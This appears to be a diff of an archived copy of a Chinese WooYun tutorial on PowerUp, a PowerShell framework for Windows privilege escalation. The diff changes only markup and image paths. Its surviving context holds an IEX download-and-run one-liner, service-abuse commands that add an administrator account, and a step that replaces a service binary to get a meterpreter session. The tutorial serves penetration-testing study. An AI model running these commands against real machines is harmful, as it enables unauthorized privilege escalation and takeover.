@@ -3,14 +3,14 @@
 			<head>
 			     <title>Powershell 提权框架-Powerup - Evi1cg</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/11989">http://drops.wooyun.org/tips/11989</a></h1>
 				
       <p>
-        <h1>0x00 简介</h1>
+        </p><h1>0x00 简介</h1>
 
-<hr />
+<hr>
 
 <p>通常，在Windows下面我们可以通过内核漏洞来提升权限，但是，我们常常会碰到所处服务器通过内核漏洞提权是行不通的，这个时候，我们就需要通过脆弱的Windows服务提权，比如我们替换掉服务所依赖的DLL文件，当服务重启时，加载我们替换的DLL文件从而完成比如添加管理员账号的操作。或者通过常见的Mssql，Mysql等服务，通过其继承的系统权限来完成提权等等，而今天我将介绍一个非常实用的Powershell框架-Powerup，此框架可以在内核提权行不通的时候，帮助我们寻找服务器脆弱点进而通过脆弱点实现提权的目的。</p>
 
@@ -18,7 +18,7 @@
 
 <h1>0x01 使用</h1>
 
-<hr />
+<hr>
 
 <p>要使用Powerup，首先需要下载此脚本:<a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">Powerup</a>，之后加载此脚本：</p>
 
@@ -35,7 +35,7 @@ PS E:\&gt; Import-Module .\PowerUp.psm1
 PS E:\&gt; Get-Command -Module powerup
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715323324482128.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715323324482128.png" alt="Alt text"></p>
 
 <p>输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用"<code>Get-help [cmdlet] -full</code>"来查看，比如"<code>Get-Help Find-DLLHijack -full</code>"， 如果要将输出的结果导出到一个文件可以使用<code>Out-File</code>，如下：</p>
 
@@ -63,7 +63,7 @@ E:\&gt; powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).Download
 
 <h1>0x02 模块介绍</h1>
 
-<hr />
+<hr>
 
 <p><strong>Find-DLLHijack</strong></p>
 
@@ -112,7 +112,7 @@ PS C:\&gt; '"E:\temp\123123.xlsx" -f "C:\LibAntiPrtSc_ERROR.log"' | Get-Modifiab
   <p>前面为文件路径</p>
 </blockquote>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715323512669217.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715323512669217.png" alt="Alt text"></p>
 
 <p><strong>Get-RegAlwaysInstallElevated</strong></p>
 
@@ -144,7 +144,7 @@ PS C:\&gt; Get-RegAutoLogon
 PS C:\&gt; Get-ServiceDetail -ServiceName Dhcp #获取DHCP服务的详细信息
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715323780386314.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715323780386314.png" alt="Alt text"></p>
 
 <p><strong>Get-ServiceFilePermission</strong></p>
 
@@ -156,7 +156,7 @@ PS C:\&gt; Get-ServiceDetail -ServiceName Dhcp #获取DHCP服务的详细信息
 PS C:\&gt; Get-ServiceFilePermission
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715323944700415.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715323944700415.png" alt="Alt text"></p>
 
 <p><strong>Get-ServicePermission</strong></p>
 
@@ -184,7 +184,7 @@ PS C:\&gt; Get-ServicePermission
 PS C:\&gt;Get-ServiceUnquoted
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715324067218513.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715324067218513.png" alt="Alt text"></p>
 
 <p><strong>Get-UnattendedInstallFile</strong></p>
 
@@ -262,7 +262,7 @@ PS C:\&gt;get-webconfig | Format-Table -Autosize #列表显示
 PS C:\&gt; Invoke-AllChecks
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715324415038610.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715324415038610.png" alt="Alt text"></p>
 
 <p><strong>Invoke-Service</strong></p>
 
@@ -296,7 +296,7 @@ PS C:\&gt; Invoke-ServiceAbuse -ServiceName VulnSVC -Command "net ..." # 自定�
 
 <p>默认的账号可以通过修改默认参数来修改，如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/201601071532454977879.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601071532454977879.png" alt="Alt text"></p>
 
 <p><strong>Restore-ServiceBinary</strong></p>
 
@@ -328,7 +328,7 @@ PS C:\&gt; Restore-ServiceBinary -ServiceName VulnSVC
 PS C:\&gt; Write-HijackDll -OutputFile 'E:\temp\test.dll' -Command 'whoami'
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/201601071532475692889.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601071532475692889.png" alt="Alt text"></p>
 
 <p><strong>Write-UserAddMSI</strong></p>
 
@@ -372,7 +372,7 @@ PS C:\&gt; Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."
 
 <h1>0x03 实战提权</h1>
 
-<hr />
+<hr>
 
 <p>测试环境为win10。平常用的虚拟机，并没有特意去配置存在漏洞的环境，所以并不是所有的模块均可以使用。实际测试可以根据实际环境来调整。此次测试并未使用内核漏洞来提权。</p>
 
@@ -384,11 +384,11 @@ C:\Windows\system32&gt;net user powerup 1 /add
 
 <p>查看powerup账号权限：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/201601071532492135499.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/201601071532492135499.png" alt="Alt text"></p>
 
 <p>使用powerup账号登陆系统，加载Powerup：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715325048065109.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715325048065109.png" alt="Alt text"></p>
 
 <p>执行Invoke-AllChecks:</p>
 
@@ -433,19 +433,19 @@ AbuseFunction  : Install-ServiceBinary -ServiceName 'wampmysqld'
 PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -UserName rockyou -Password 123
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/20160107153252940591113.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/20160107153252940591113.png" alt="Alt text"></p>
 
 <p>之后当管理员运行该服务的时候，则会添加我们的账号，运行前：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715325373625129.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715325373625129.png" alt="Alt text"></p>
 
 <p>运行服务以后：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715325568590135.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715325568590135.png" alt="Alt text"></p>
 
 <p>查看该账号权限：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715325636287145.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715325636287145.png" alt="Alt text"></p>
 
 <p>当然，除了添加账号，我们同样可使用msf获得meterpreter会话。</p>
 
@@ -479,7 +479,7 @@ PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -Command "powershell.
 
 <p>当管理员运行此服务以后则获取高权限的meterpreter会话</p>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715325850281155.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715325850281155.png" alt="Alt text"></p>
 
 <p>提权以后，使用<code>Restore-ServiceBinary</code> 恢复文件：</p>
 
@@ -487,17 +487,17 @@ PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -Command "powershell.
 PS E:\&gt; Restore-ServiceBinary -ServiceName 'wampapache'
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160107/2016010715330067708164.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/2016010715330067708164.png" alt="Alt text"></p>
 
 <p>可以看到，我们使用powerup成功提权了。当然碰到实际的环境可以根据不同环境不同方式来进行提权。</p>
 
 <h1>0x05 小结</h1>
 
-<hr />
+<hr>
 
 <p>Powerup提供了一些我们并不常见的提权方式，并且为我们的Windows提权提供了极大的方便，如果碰到未安装Powershell的计算机，可以详细参考Powerup里面的函数实现过程来通过别的方式来实现同样的效果，希望本文对你有帮助。</p>
 
-<p><strong>本文由evi1cg原创并首发于乌云drops，转载请注明</strong></p>      </p>
+<p><strong>本文由evi1cg原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
     
 			</body>
 		</html>
